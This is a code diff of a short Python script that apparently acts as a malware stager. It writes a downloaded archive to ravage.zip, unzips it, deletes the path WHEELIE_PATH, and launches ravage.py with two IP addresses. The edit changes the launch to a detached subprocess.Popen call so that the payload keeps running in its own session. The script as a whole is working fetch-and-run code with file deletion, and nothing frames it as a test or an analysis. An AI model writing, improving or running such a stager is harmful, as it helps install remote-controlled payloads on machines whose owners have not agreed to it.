@@ -2,6 +2,7 @@ import random
 import string
 from urllib import request
 import os
+import subprocess
 
 
 def get_random_string(length):
@@ -26,5 +27,7 @@ with open(f'{RAVAGE_DIR}/ravage.zip', 'wb') as fh:
     fh.write(data)
 
 os.system(f'unzip -o -q {RAVAGE_DIR}/ravage.zip -d {RAVAGE_DIR}/')
-os.chdir(RAVAGE_DIR)
-os.system(f'rm -rf {WHEELIE_PATH}; python3 {RAVAGE_DIR}/ravage.py {SOUNDWAVE_IP} {RAVAGE_IP} &')
+os.system(f'rm -rf {WHEELIE_PATH}')
+
+subprocess.Popen(['python3', f'{RAVAGE_DIR}/ravage.py', SOUNDWAVE_IP, RAVAGE_IP],
+                 cwd=RAVAGE_DIR, start_new_session=True)
